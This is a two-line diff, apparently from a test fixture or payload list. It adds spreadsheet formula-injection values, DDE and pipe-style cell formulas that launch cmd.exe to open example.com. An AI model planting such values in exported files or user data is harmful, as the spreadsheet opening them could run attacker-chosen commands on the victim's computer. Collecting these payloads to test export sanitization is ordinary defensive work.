@@ -1,0 +1,2 @@
+=DDE("cmd","/c start https://example.com")
+@SUM(1+1)*cmd|"/c start https://example.com"!A0
